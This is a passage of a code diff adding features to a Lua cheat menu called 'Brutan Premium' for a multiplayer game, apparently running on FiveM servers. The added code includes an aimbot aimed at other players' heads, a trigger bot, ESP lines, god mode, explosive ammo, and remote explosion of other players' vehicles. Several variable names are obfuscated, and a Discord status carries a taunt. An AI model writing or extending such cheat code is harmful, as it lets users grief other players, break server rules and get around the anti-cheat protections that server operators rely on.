+                                LineOneEnd.x,
+                                LineOneEnd.y,
+                                LineOneEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                LineTwoBegin.x,
+                                LineTwoBegin.y,
+                                LineTwoBegin.z,
+                                LineTwoEnd.x,
+                                LineTwoEnd.y,
+                                LineTwoEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                LineThreeBegin.x,
+                                LineThreeBegin.y,
+                                LineThreeBegin.z,
+                                LineThreeEnd.x,
+                                LineThreeEnd.y,
+                                LineThreeEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                LineThreeEnd.x,
+                                LineThreeEnd.y,
+                                LineThreeEnd.z,
+                                LineFourBegin.x,
+                                LineFourBegin.y,
+                                LineFourBegin.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                TLineOneBegin.x,
+                                TLineOneBegin.y,
+                                TLineOneBegin.z,
+                                TLineOneEnd.x,
+                                TLineOneEnd.y,
+                                TLineOneEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                TLineTwoBegin.x,
+                                TLineTwoBegin.y,
+                                TLineTwoBegin.z,
+                                TLineTwoEnd.x,
+                                TLineTwoEnd.y,
+                                TLineTwoEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                TLineThreeBegin.x,
+                                TLineThreeBegin.y,
+                                TLineThreeBegin.z,
+                                TLineThreeEnd.x,
+                                TLineThreeEnd.y,
+                                TLineThreeEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                TLineThreeEnd.x,
+                                TLineThreeEnd.y,
+                                TLineThreeEnd.z,
+                                TLineFourBegin.x,
+                                TLineFourBegin.y,
+                                TLineFourBegin.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                ConnectorOneBegin.x,
+                                ConnectorOneBegin.y,
+                                ConnectorOneBegin.z,
+                                ConnectorOneEnd.x,
+                                ConnectorOneEnd.y,
+                                ConnectorOneEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                ConnectorTwoBegin.x,
+                                ConnectorTwoBegin.y,
+                                ConnectorTwoBegin.z,
+                                ConnectorTwoEnd.x,
+                                ConnectorTwoEnd.y,
+                                ConnectorTwoEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                ConnectorThreeBegin.x,
+                                ConnectorThreeBegin.y,
+                                ConnectorThreeBegin.z,
+                                ConnectorThreeEnd.x,
+                                ConnectorThreeEnd.y,
+                                ConnectorThreeEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                            DrawLine(
+                                ConnectorFourBegin.x,
+                                ConnectorFourBegin.y,
+                                ConnectorFourBegin.z,
+                                ConnectorFourEnd.x,
+                                ConnectorFourEnd.y,
+                                ConnectorFourEnd.z,
+                                a8.r,
+                                a8.g,
+                                a8.b,
+                                255
+                            )
+                        end
+                        if jfjfjf and esp then
+                            DrawLine(d8, d9, da, x, y, z, a8.r, a8.g, a8.b, 255)
+                        end
+                    end
+                end
+            end
 
+            if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
+                    SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
+                end
 
-            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
+            if rainbowTint then
+                for i = 0, #allWeapons do
+                    if HasPedGotWeapon(PlayerPedId(), GetHashKey(allWeapons[i])) then
+                        SetPedWeaponTintIndex(PlayerPedId(), GetHashKey(allWeapons[i]), math.random(0, 7))
+                    end
+                end
+            end
+
+            if showCoords then
+                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
+                roundx=tonumber(string.format("%.2f",kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc))
+                roundy=tonumber(string.format("%.2f",riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl))
+                roundz=tonumber(string.format("%.2f",ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
+				local playerPedsss = PlayerPedId()
+				roundzxx = GetEntityHeading(playerPedsss)
+                bf("~r~X:~s~ "..roundx,0.05,0.00)
+                bf("~r~Y:~s~ "..roundy,0.11,0.00)
+                bf("~r~Z:~s~ "..roundz,0.17,0.00)
+				bf("~r~H:~s~ "..roundzxx,0.23,0.00)
+            end
+
+            if bulletGun then
+                local startDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
+                local endDistance = GetDistance(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
+                startDistance = startDistance + 0.25
+                endDistance = endDistance + 1000.0
+
+                if IsPedOnFoot(PlayerPedId()) and IsPedShooting(PlayerPedId()) then
+                    local bullet = GetHashKey(bullets[selectedBullet])
+                    if not HasWeaponAssetLoaded(bullet) then
+                        RequestWeaponAsset(bullet, 31, false)
+                        while not HasWeaponAssetLoaded(bullet) do
+                            Citizen.Wait(0)
+                        end
+                    end
+                    ShootSingleBulletBetweenCoords(add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), startDistance)).z, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).x, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).y, add(GetGameplayCamCoord(), multiply(rotDirection(GetGameplayCamRot(0)), endDistance)).z, 250, true, bullet, PlayerPedId(), true, false, -1.0)
+                end
+
+            end
+
+            if vehicleGun then
+                local heading = GetEntityHeading(PlayerPedId())
+                local model = GetHashKey(vehicles[selectedVehicle])
+                local rot = GetGameplayCamRot(0)
+                local dir = RotToDirection(rot)
+                local camPosition = GetGameplayCamCoord()
+                local playerPosition = GetEntityCoords(PlayerPedId(), true)
+                local spawnDistance = GetDistance(camPosition, playerPosition)
+                spawnDistance = spawnDistance + 5
+                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))
+
+                RequestModel(model)
+                while not HasModelLoaded(model) do
+                    debugPrint("Loading Model...")
+                    Citizen.Wait(0)
+                end
+
+                if HasModelLoaded(model) then
+                    if IsPedShooting(PlayerPedId()) then
+                        if IsPedOnFoot(PlayerPedId()) then
+                        local veh = CreateVehicle(model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
+                        SetVehicleForwardSpeed(veh, 120.0)
+                        SetModelAsNoLongerNeeded(model)
+                        SetVehicleAsNoLongerNeeded(veh)
+                        end
+                    end
+                end
+            end
+
+            if pedGun then
+                local heading = GetEntityHeading(PlayerPedId())
+                local rot = GetGameplayCamRot(0)
+                local dir = RotToDirection(rot)
+                local camPosition = GetGameplayCamCoord()
+                local playerPosition = GetEntityCoords(PlayerPedId(), true)
+                local spawnDistance = GetDistance(camPosition, playerPosition)
+                spawnDistance = spawnDistance + 5
+                local spawnPosition = add(camPosition, multiply(dir, spawnDistance))
+
+                local model = GetHashKey(peds[selectedPed])
+
+                RequestModel(model)
+                while not HasModelLoaded(model) do
+                    Citizen.Wait(0)
+                end
+
+                if HasModelLoaded(model) then
+                    if IsPedShooting(PlayerPedId()) then
+                        local spawnedPed = CreatePed(26, model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
+                        SetEntityRecordsCollisions(spawnedPed, true)
+                        for f = 0.0, 75.0 do
+                            if HasEntityCollidedWithAnything(spawnedPed) then break end
+                                ApplyForceToEntity(spawnedPed, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
+                        end
+                    end
+                end
+            end
+
+            if forceGun then
+                local rot = GetGameplayCamRot(0)
+                local dir = RotToDirection(rot)
+                local heading = GetEntityHeading(PlayerPedId())
+                if IsPedShooting(PlayerPedId()) then
+                    local aiming, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
+                    if aiming then
+                        if IsPedInAnyVehicle(entity) then
+                            local veh = GetVehiclePedIsUsing(entity)
+                            DeleteEntity(entity)
+                            SetEntityHeading(veh, heading)
+                            SetVehicleForwardSpeed(veh, 150.0)
+                        else
+                            for i = 0, 10 do
+                                ApplyForceToEntity(entity, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
+                            end
+                        end
+                    end
+                end
+            end
+
+					if IsControlPressed(0, 323) and DoesEntityExist(Deer.Handle) then
+		Deer.Destroy()
+		end
+			
+            if bifegfubffff then
+                local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
+                if impact then
+                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+                end
+            end
+			
+			 if rainbow then
+                    local color = k(1.0)
+                    for i = 0, #allMenus do
+                        BrutanPremium.SetSpriteColor(allMenus[i], color.r, color.g, color.b, 255)  
+                    end  
+                    for i, dA in pairs(bd) do                 
+                        BrutanPremium.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)  
+                    end
+                    for i, dA in pairs(be) do 
+                        BrutanPremium.SetSpriteColor(dA.id, color.r, color.g, color.b, 255)
+                    end
+                end
+                
+                if animated then                                   
+                            Citizen.Wait(50)                  
+                            for i = 0, #allMenus do
+                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal1") 
+                            end
+                            for i, dA in pairs(bd) do
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
+                                  
+                            end
+                            for i, dA in pairs(be) do 
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal1") 
+                                
+                            end      
+                            Citizen.Wait(50)                  
+                            for i = 0, #allMenus do
+                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal2") 
+                            end
+                            for i, dA in pairs(bd) do
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
+                                  
+                            end
+                            for i, dA in pairs(be) do 
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal2") 
+                                
+                            end       
+                            Citizen.Wait(50)                  
+                            for i = 0, #allMenus do
+                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal3") 
+                            end
+                            for i, dA in pairs(bd) do
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
+                                  
+                            end
+                            for i, dA in pairs(be) do 
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal3") 
+                                
+                            end       
+                            Citizen.Wait(50)                  
+                            for i = 0, #allMenus do
+                                BrutanPremium.SetTitleBackgroundSprite(allMenus[i], "digitaloverlay", "signal4") 
+                            end
+                            for i, dA in pairs(bd) do
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
+                                  
+                            end
+                            for i, dA in pairs(be) do 
+                                BrutanPremium.SetTitleBackgroundSprite(dA.id, "digitaloverlay", "signal4") 
+                                
+                            end                          
+                end
+			
+			if explosiveAmmo then
+                local impact1, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
+                if impact1 then
+                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+					Citizen.Wait(200)
+					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+					Citizen.Wait(200)
+					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+					Citizen.Wait(150)
+					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+					Citizen.Wait(150)
+					AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
+                end
+            end
+
+			if RainbowVeh then
+                local u48y34 = k(1.0)
+                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+            end
+			
+			if ou328hSync then
+                local u48y34 = k(1.0)
+				local ped = PlayerPedId()
+                local veh = GetVehiclePedIsUsing(ped)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 1, true)
+                SetVehicleNeonLightEnabled(veh, 2, true)
+                SetVehicleNeonLightEnabled(veh, 3, true)
+				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+            end
+			
+			
+			if ou328hNeon then
+                local u48y34 = k(1.0)
+		    local ped = PlayerPedId()
+            local veh = GetVehiclePedIsUsing(ped)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 0, true)
+                SetVehicleNeonLightEnabled(veh, 1, true)
+                SetVehicleNeonLightEnabled(veh, 2, true)
+                SetVehicleNeonLightEnabled(veh, 3, true)
+                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
+            end
+			
+			if LOJWDNDDNDN then
+                local u48y34 = k(1.0)
+		    local ped = PlayerPedId()
+            local veh = GetVehiclePedIsUsing(ped)
+               SetVehicleDirtLevel(veh, 1.0)
+				else
+            end
+			
+			if CLEAR then
+								SetWeatherTypePersist("CLEAR")
+        SetWeatherTypeNowPersist("CLEAR")
+        SetWeatherTypeNow("CLEAR")
+        SetOverrideWeather("CLEAR")
+		end
+		
+					if BLIZZARD then
+								SetWeatherTypePersist("BLIZZARD")
+        SetWeatherTypeNowPersist("BLIZZARD")
+        SetWeatherTypeNow("BLIZZARD")
+        SetOverrideWeather("BLIZZARD")
+		end
+		
+					if FOGGY then
+								SetWeatherTypePersist("FOGGY")
+        SetWeatherTypeNowPersist("FOGGY")
+        SetWeatherTypeNow("FOGGY")
+        SetOverrideWeather("FOGGY")
+		end
+		
+					if EXTRASUNNY then
+								SetWeatherTypePersist("EXTRASUNNY")
+        SetWeatherTypeNowPersist("EXTRASUNNY")
+        SetWeatherTypeNow("EXTRASUNNY")
+        SetOverrideWeather("EXTRASUNNY")
+		end
+			
+			if XMAS then
+			            SetForceVehicleTrails(true)
+            SetForcePedFootstepsTracks(true)
+					SetWeatherTypePersist("XMAS")
+        SetWeatherTypeNowPersist("XMAS")
+        SetWeatherTypeNow("XMAS")
+        SetOverrideWeather("XMAS")
+		end
+			
+            if LOJ38 then
+                for i = 0, 128 do
+                    if i ~= PlayerId() then
+                        if IsPlayerFreeAiming(PlayerId()) then
+                            local TargetPed = GetPlayerPed(i)
+                            local TargetPos = GetEntityCoords(TargetPed)
+                            local Exist = DoesEntityExist(TargetPed)
+                            local Dead = IsPlayerDead(TargetPed)
+
+                            if Exist and not Dead then
+                                local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
+                                if IsEntityVisible(TargetPed) and OnScreen then
+                                    if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
+                                        local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
+                                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+			
+			if IsControlJustReleased(0, Keys['X']) then
+			ClearPedTasks(PlayerPedId())
+		end
+			
+						if Nigubdddddd then 
+			local veh = GetVehiclePedIsUsing(PlayerPedId(-1))
+			if IsControlPressed(0, 232) then
+			SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
+			end
+				if veh ~= nil then
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 15000000.0);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fDriveBiasFront", 0.50);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 4.5);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 4.38);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fBrakeForce", 5.00);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fEngineDamageMult", 0.50);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 65.00);
+					SetVehicleHandlingFloat(veh, "CHandlingData", "fRollCentreHeightFront", 0.80);
+					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 36.0)
+					SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(PlayerPedId(-1), false), 60.0);
+				end
+			end
+
+			            if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
                 if IsControlPressed(0, 209) then
                     SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 100.0)
                 elseif IsControlPressed(0, 210) then
                     SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
                 end
             end
+			
             if TriggerBot then
-                local dp, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity)
-                if dp then
+                local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
+                if Aiming then
                     if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                         ShootPlayer(Entity)
                     end
                 end
             end
-            DisplayRadar(true)
-            if RainbowVeh then
-                local dq = k(1.0)
-                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
-                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), dq.r, dq.g, dq.b)
-            end
-            if rainbowh then
-                for i = -1, 12 do
-                    Citizen.Wait(100)
-                    local a8 = k(1.0)
-                    SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
-                    SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), a8.r, a8.g, a8.b)
-                    if i == 12 then
-                        i = -1
-                    end
-                end
-            end
-            if t2x then
-                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
-            end
-            if t4x then
-                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
-            end
-            if t10x then
-                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0)
-            end
-            if t16x then
-                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
-            end
-            if txd then
-                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0)
-            end
-            if tbxd then
-                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9999.0 * 20.0)
-            end
-			if Noclip2 then
-				local Ped = PlayerPedId()
-	            --local pos = GetEntityCoords(Ped, false)
-                local pos = GetOffsetFromEntityInWorldCoords(Ped, 0, 3.2, 0)
-			        if IsDisabledControlPressed(0, 55) then
-                        ApplyForceToEntity(GetPlayerPed(-1), 1, pos.x*0,pos.y*0,pos.z*0.099, 0,0,0, 1, false, true, true, true, true)
-                    end					
 
-			end		
-            if Noclip1 then
-                local dr = 2
-                local ds =
-                    IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
-                    PlayerPedId(-1)
-                --FreezeEntityPosition(PlayerPedId(-1), true)
-                --SetEntityInvincible(PlayerPedId(-1), true)
-                local dt = GetEntityCoords(entity)
-                DisableControlAction(0, 32, true)
-                DisableControlAction(0, 268, true)
-                DisableControlAction(0, 31, true)
-                DisableControlAction(0, 269, true)
-                DisableControlAction(0, 33, true)
-                DisableControlAction(0, 266, true)
-                DisableControlAction(0, 34, true)
-                DisableControlAction(0, 30, true)
-                DisableControlAction(0, 267, true)
-                DisableControlAction(0, 35, true)
-                DisableControlAction(0, 44, true)
-                DisableControlAction(0, 20, true)
-                local du = 0.0
-                local dv = 0.0
-                if GetInputMode() == 'MouseAndKeyboard' then
-                    if IsDisabledControlPressed(0, 32) then
-                        du = 0.5
-                    end
-                    if IsDisabledControlPressed(0, 33) then
-                        du = -0.5
-                    end
-                    if IsDisabledControlPressed(0, 34) then
-                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 1.0)
-                    end
-                    if IsDisabledControlPressed(0, 35) then
-                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 1.0)
-                    end
-                    if IsDisabledControlPressed(0, 44) then
-                        dv = 0.21
-                    end
-                    if IsDisabledControlPressed(0, 20) then
-                        dv = -0.21
+            if fastrun then
+                SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
+                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
+            else
+                SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
+                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
+            end
+			
+			if godmode then
+			SetEntityInvincible(GetPlayerPed(-1), true)
+			SetPlayerInvincible(PlayerId(), true)
+			SetPedCanRagdoll(GetPlayerPed(-1), false)
+			ClearPedBloodDamage(GetPlayerPed(-1))
+			ResetPedVisibleDamage(GetPlayerPed(-1))
+			ClearPedLastWeaponDamage(GetPlayerPed(-1))
+			SetEntityProofs(GetPlayerPed(-1), true, true, true, true, true, true, true, true)
+			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), false)
+			SetEntityCanBeDamaged(GetPlayerPed(-1), false)
+		else
+			SetEntityInvincible(GetPlayerPed(-1), false)
+			SetPlayerInvincible(PlayerId(), false)
+			SetPedCanRagdoll(GetPlayerPed(-1), true)
+			ClearPedLastWeaponDamage(GetPlayerPed(-1))
+			SetEntityProofs(GetPlayerPed(-1), false, false, false, false, false, false, false, false)
+			SetEntityOnlyDamagedByPlayer(GetPlayerPed(-1), true)
+			SetEntityCanBeDamaged(GetPlayerPed(-1), true)
+		end
+
+		if discordPresence then
+                    SetDiscordAppId(628637344098025482)
+            
+                    SetDiscordRichPresenceAsset('Brutan Premium')
+                    
+					SetRichPresence('Brutan#7799')
+			
+                    SetDiscordRichPresenceAssetText('Brutan Premium | Lol Fuck you')
+                
+                    SetDiscordRichPresenceAssetSmall('Brutan Premium')
+            
+                    SetDiscordRichPresenceAssetSmallText('BRUTAN ON YOUTUBE')
+            
+                end
+		
+            if SuperJump then
+                SetSuperJumpThisFrame(PlayerId())
+            end
+			
+			if ePunch then
+				SetExplosiveMeleeThisFrame(PlayerId())
+			end
+			
+			if NOXJDSS then
+                local cI = {
+                    [453432689] = 1.0,
+                    [3219281620] = 1.0,
+                    [1593441988] = 1.0,
+                    [584646201] = 1.0,
+                    [2578377531] = 1.0,
+                    [324215364] = 1.0,
+                    [736523883] = 1.0,
+                    [2024373456] = 1.0,
+                    [4024951519] = 1.0,
+                    [3220176749] = 1.0,
+                    [961495388] = 1.0,
+                    [2210333304] = 1.0,
+                    [4208062921] = 1.0,
+                    [2937143193] = 1.0,
+                    [2634544996] = 1.0,
+                    [2144741730] = 1.0,
+                    [3686625920] = 1.0,
+                    [487013001] = 1.0,
+                    [1432025498] = 1.0,
+                    [2017895192] = 1.0,
+                    [3800352039] = 1.0,
+                    [2640438543] = 1.0,
+                    [911657153] = 1.0,
+                    [100416529] = 1.0,
+                    [205991906] = 1.0,
+                    [177293209] = 1.0,
+                    [856002082] = 1.0,
+                    [2726580491] = 1.0,
+                    [1305664598] = 1.0,
+                    [2982836145] = 1.0,
+                    [1752584910] = 1.0,
+                    [1119849093] = 1.0,
+                    [3218215474] = 1.0,
+                    [1627465347] = 1.0,
+                    [3231910285] = 1.0,
+                    [-1768145561] = 1.0,
+                    [3523564046] = 1.0,
+                    [2132975508] = 1.0,
+                    [-2066285827] = 1.0,
+                    [137902532] = 1.0,
+                    [2828843422] = 1.0,
+                    [984333226] = 1.0,
+                    [3342088282] = 1.0,
+                    [1785463520] = 1.0,
+                    [1672152130] = 0,
+                    [1198879012] = 1.0,
+                    [171789620] = 1.0,
+                    [3696079510] = 1.0,
+                    [1834241177] = 1.0,
+                    [3675956304] = 1.0,
+                    [3249783761] = 1.0,
+                    [-879347409] = 1.0,
+                    [4019527611] = 1.0,
+                    [1649403952] = 1.0,
+                    [317205821] = 1.0,
+                    [125959754] = 1.0,
+                    [3173288789] = 1.0
+                }
+                if IsPedShooting(PlayerPedId(-1)) and not IsPedDoingDriveby(PlayerPedId(-1)) then
+                    local _, cJ = GetCurrentPedWeapon(PlayerPedId(-1))
+                    _, cAmmo = GetAmmoInClip(PlayerPedId(-1), cJ)
+                    if cI[cJ] and cI[cJ] ~= 0 then
+                        tv = 0
+                        if GetFollowPedCamViewMode() ~= 4 then
+                            repeat
+                                Wait(0)
+                                p = GetGameplayCamRelativePitch()
+                                SetGameplayCamRelativePitch(p + 0.0, 0.0)
+                                tv = tv + 0.0
+                            until tv >= cI[cJ]
+                        else
+                            repeat
+                                Wait(0)
+                                p = GetGameplayCamRelativePitch()
+                                if cI[cJ] > 0.0 then
+                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
+                                    tv = tv + 0.0
+                                else
+                                    SetGameplayCamRelativePitch(p + 0.0, 0.0)
+                                    tv = tv + 0.0
+                                end
+                            until tv >= cI[cJ]
+                        end
                     end
                 end
-                dt = GetOffsetFromEntityInWorldCoords(ds, 0.0, du * (dr + 0.7), dv * (dr + 0.7))
-                local bL = GetEntityHeading(ds)
-                SetEntityVelocity(ds, 0.0, 0.0, 0.0)
-                SetEntityRotation(ds, 0.0, 0.0, 0.0, 0, false)
-                SetEntityHeading(ds, bL)
-                SetEntityCollision(ds, false, false)
-                SetEntityCoordsNoOffset(ds, dt.x, dt.y, dt.z, true, true, true)
-                FreezeEntityPosition(ds, false)
-                --SetEntityInvincible(ds, false)
-                SetEntityCollision(ds, true, true)
-            end				
-            if Noclip then
-                local dr = 2
-                local ds =
-                    IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
-                    PlayerPedId(-1)
-                FreezeEntityPosition(PlayerPedId(-1), true)
-                SetEntityInvincible(PlayerPedId(-1), true)
-                local dt = GetEntityCoords(entity)
-                DisableControlAction(0, 32, true)
-                DisableControlAction(0, 268, true)
-                DisableControlAction(0, 31, true)
-                DisableControlAction(0, 269, true)
-                DisableControlAction(0, 33, true)
-                DisableControlAction(0, 266, true)
-                DisableControlAction(0, 34, true)
-                DisableControlAction(0, 30, true)
-                DisableControlAction(0, 267, true)
-                DisableControlAction(0, 35, true)
-                DisableControlAction(0, 44, true)
-                DisableControlAction(0, 20, true)
-                local du = 0.0
-                local dv = 0.0
-                if GetInputMode() == 'MouseAndKeyboard' then
-                    if IsDisabledControlPressed(0, 32) then
-                        du = 0.5
+            end
+
+            if Oneshot then
+                SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
+                local gotEntity = getEntity(PlayerId())
+                if IsEntityAPed(gotEntity) then
+                    if IsPedInAnyVehicle(gotEntity, true) then
+                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
+                            if IsControlJustReleased(1, 69) then
+                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
+                            end
+                        else
+                            if IsControlJustReleased(1, 142) then
+                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
+                            end
+                        end
                     end
-                    if IsDisabledControlPressed(0, 33) then
-                        du = -0.5
-                    end
-                    if IsDisabledControlPressed(0, 34) then
-                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0)
-                    end
-                    if IsDisabledControlPressed(0, 35) then
-                        SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0)
-                    end
-                    if IsDisabledControlPressed(0, 44) then
-                        dv = 0.21
-                    end
-                    if IsDisabledControlPressed(0, 20) then
-                        dv = -0.21
+                elseif IsEntityAVehicle(gotEntity) then
+                    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
+                        if IsControlJustReleased(1, 69) then
+                            NetworkExplodeVehicle(gotEntity, true, true, 0)
+                        end
+                    else
+                        if IsControlJustReleased(1, 142) then
+                            NetworkExplodeVehicle(gotEntity, true, true, 0)
+                        end
                     end
                 end
